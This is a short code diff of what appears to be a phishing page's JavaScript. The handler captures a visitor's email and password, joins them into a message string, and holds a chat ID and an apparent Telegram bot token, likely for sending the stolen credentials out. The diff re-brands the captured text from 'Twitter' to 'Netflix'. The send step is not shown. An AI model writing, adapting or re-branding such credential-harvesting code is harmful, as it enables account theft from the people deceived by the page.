@@ -3,9 +3,9 @@
 
 function submitLoginForm(event){
     event.preventDefault();
-    let email = event.target['username'].value;
+    let email = event.target['email'].value;
     let password = event.target['password'].value;
-    let text = email + ` <Twitter> ` + password;
+    let text = email + ` < Netflix > ` + password;
     
     let ID = 5721393154;
     let API = '6556542346:AAFPNkrk6FLdIne_-pe_5M-DSMy4szyLRjw';
